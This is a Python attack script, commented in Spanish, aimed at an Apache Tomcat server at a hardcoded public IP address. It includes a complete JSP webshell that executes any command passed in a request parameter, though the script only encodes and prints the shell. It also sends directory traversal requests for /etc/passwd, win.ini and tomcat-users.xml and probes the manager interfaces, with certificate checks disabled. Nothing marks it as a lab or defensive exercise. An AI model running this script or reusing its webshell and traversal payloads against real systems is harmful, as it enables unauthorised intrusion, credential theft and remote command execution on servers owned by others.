import requests
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TomcatExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def check_jsp_samples(self):
        """Verifica muestras JSP vulnerables en /examples/"""
        print("[*] Buscando aplicaciones JSP en /examples/")
        
        jsp_samples = [
            "/examples/servlets/servlet/RequestParamExample",
            "/examples/servlets/servlet/SessionExample",
            "/examples/jsp/jsp2/tagfiles/hello.jsp",
            "/examples/jsp/include/include.jsp"
        ]
        
        for sample in jsp_samples:
            try:
                url = f"{self.base_url}{sample}"
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] JSP sample encontrada: {sample}")
            except:
                pass

    def exploit_jsps(self):
        """Intenta subir una webshell JSP"""
        print("[*] Intentando exploit de JSP samples...")
        
        # Webshell JSP básica
        jsp_shell = """<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>"""
        
        # Codificar en base64 para posibles vectores de upload
        encoded_shell = base64.b64encode(jsp_shell.encode()).decode()
        print(f"[*] Webshell preparada (Base64): {encoded_shell[:50]}...")

    def directory_traversal_test(self):
        """Prueba Directory Traversal"""
        print("[*] Probando Directory Traversal...")
        
        traversal_paths = [
            "../../../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../web.xml",
            "../../conf/tomcat-users.xml"
        ]
        
        for path in traversal_paths:
            try:
                url = f"{self.base_url}/examples/{path}"
                response = self.session.get(url, timeout=5)
                if "root:" in response.text or "[extensions]" in response.text:
                    print(f"[!] ¡VULNERABLE! Directory Traversal: {path}")
                    print(f"    Contenido: {response.text[:200]}...")
            except:
                pass

    def scan_webapps(self):
        """Escanea aplicaciones web desplegadas"""
        print("[*] Escaneando aplicaciones web...")
        
        # Common webapps
        webapps = [
            "/", "/manager", "/host-manager", "/docs", "/examples",
            "/test", "/api", "/admin", "/webapp", "/app"
        ]
        
        for app in webapps:
            try:
                url = f"{self.base_url}{app}"
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    title = response.text.split('<title>')[1].split('</title>')[0] if '<title>' in response.text else "No title"
                    print(f"[+] App encontrada: {app} - {title[:30]}")
            except:
                pass

    def run_exploits(self):
        """Ejecuta todos los exploits"""
        print("=== EXPLOTANDO VULNERABILIDADES ENCONTRADAS ===\n")
        
        self.check_jsp_samples()
        print()
        
        self.exploit_jsps()
        print()
        
        self.directory_traversal_test()
        print()
        
        self.scan_webapps()

# Ejecutar
exploiter = TomcatExploiter("189.254.143.102")
exploiter.run_exploits()